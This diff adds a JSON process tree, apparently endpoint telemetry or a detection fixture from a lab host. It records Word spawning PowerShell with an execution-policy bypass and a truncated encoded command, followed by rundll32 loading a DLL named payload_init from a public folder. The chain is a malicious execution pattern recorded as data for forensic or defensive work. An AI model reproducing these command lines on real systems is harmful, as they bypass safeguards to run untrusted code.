@@ -1,0 +1,24 @@
+{
+  "host": "WKST-LAB-078",
+  "collected_utc": "2024-10-18T13:05:44Z",
+  "root": {
+    "pid": 6012,
+    "name": "winword.exe",
+    "user": "LAB\\contractor",
+    "children": [
+      {
+        "pid": 6040,
+        "name": "powershell.exe",
+        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA...",
+        "children": [
+          {
+            "pid": 6066,
+            "name": "rundll32.exe",
+            "command_line": "rundll32.exe C:\\Users\\Public\\Updates\\payload_init.dll,DllRegisterServer",
+            "children": []
+          }
+        ]
+      }
+    ]
+  }
+}
